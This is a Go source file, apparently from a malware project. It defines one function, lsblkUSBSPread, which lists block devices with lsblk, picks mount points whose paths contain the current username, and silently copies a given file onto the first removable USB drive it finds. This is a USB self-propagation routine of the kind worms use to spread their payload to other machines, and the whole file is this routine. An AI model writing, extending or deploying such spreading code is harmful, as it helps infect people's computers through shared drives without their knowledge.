package core

import (
	"os/exec"
	"strings"
)

func lsblkUSBSPread(filepath string) {
	if len(filepath) == 0 {
		return
	}
	allUSBS, _ := exec.Command("lsblk").Output()
	username, _ := exec.Command("whoami").Output()
	usernameSplit := strings.Split(string(username), "\n")[0]
	if len(allUSBS) < 1 {
		return
	} else {
		allUSBSSplit := strings.Split(string(allUSBS), "\n")
		for i := 0; i <= len(allUSBSSplit)-1; i++ {
			//searches for username in lsblk path output to find usb sticks
			if strings.Index(strings.Split(allUSBSSplit[i], " ")[len(strings.Split(allUSBSSplit[i], " "))-1], usernameSplit) != -1 {
				_, err := exec.Command("cp", filepath, strings.Split(allUSBSSplit[i], " ")[len(strings.Split(allUSBSSplit[i], " "))-1]).Output()
				if err != nil {
					return
				} else {
					return
				}
			}
		}
	}
	return
}
